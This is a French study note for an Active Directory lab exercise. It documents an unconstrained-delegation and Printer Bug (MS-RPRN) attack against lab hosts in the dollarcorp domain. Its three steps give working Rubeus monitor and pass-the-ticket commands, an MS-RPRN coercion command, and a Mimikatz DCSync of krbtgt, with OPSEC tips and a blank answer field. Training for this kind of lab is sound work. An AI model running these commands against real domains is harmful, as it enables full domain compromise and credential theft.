---
flag: 25
machine: dcorp-appsrv
statut: à faire
technique: Unconstrained delegation + Printer Bug
LO: "[[LO15 - Unconstrained delegation]]"
---

# F25 - Creds compromis via printer bug

> [!summary] Objectif
> Identifier le compte dont les credentials (TGT / hash) sont captures quand on force `dcorp-dc` a s'authentifier sur `dcorp-appsrv` via MS-RPRN (Printer Bug).

## Contexte
- **Etape attack flow**: apres avoir eu du local admin sur `dcorp-appsrv` (unconstrained) → on force le DC a venir s'y authent → son TGT est capture → rejeu vers `dcorp-dc` = compromis du domaine.
- **Ce qu on a**: admin local sur `dcorp-appsrv` (voir [[F24 - User domaine local admin dcorp-appsrv]]), Rubeus + MS-RPRN.exe sur la box.
- **Ce qu on cherche**: le SamAccountName du compte (compte machine du DC) dont le TGT est capture.

## Solution

### Etape 1: monitoring TGT sur dcorp-appsrv
```powershell
# Sur dcorp-appsrv (admin local requis)
C:\AD\Tools\Rubeus.exe monitor /interval:5 /nowrap
```
→ Voir [[Cheatsheet - Delegation attacks]].

### Etape 2: coercition MS-RPRN (Printer Bug)
```powershell
# Depuis la box studentx / appsrv, force DC a s auth vers appsrv
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
→ Voir [[Cheatsheet - Delegation attacks]] (section coercitions).

### Etape 3: rejeu du TGT capture (DCSync)
```powershell
# Injection du TGT base64 recu par Rubeus monitor
C:\AD\Tools\Rubeus.exe ptt /ticket:<BASE64_TGT_CAPTURE>
# Puis DCSync depuis la session actuelle
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
→ Voir [[Cheatsheet - Persistence]] (Golden Ticket suit) et [[F16 - NTLM de krbtgt]].

## Reponse

| Element | Valeur |
|---------|--------|
| Compte dont les creds sont compromis via printer bug | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- Le TGT capture est celui du **compte machine du DC** (`dcorp-dc$`), pas d'un DA humain — c'est ca l'astuce du Printer Bug (il declenche `SYSTEM` sur le DC).
- `Rubeus monitor` doit tourner AVANT MS-RPRN, sinon on rate le TGT.
- Evenement 4624/4648 sur `dcorp-appsrv` cote logs + traces MS-RPRN cote DC (spooler).
- Sans droits admin local sur appsrv → pas de LSA → pas de TGT capture.

## Refs
- [[Cheatsheet - Delegation attacks]]
- [[Cheatsheet - Persistence]]
- [[LO15 - Unconstrained delegation]]
- [[F24 - User domaine local admin dcorp-appsrv]]
- [[Synthèse - Kerberos]]
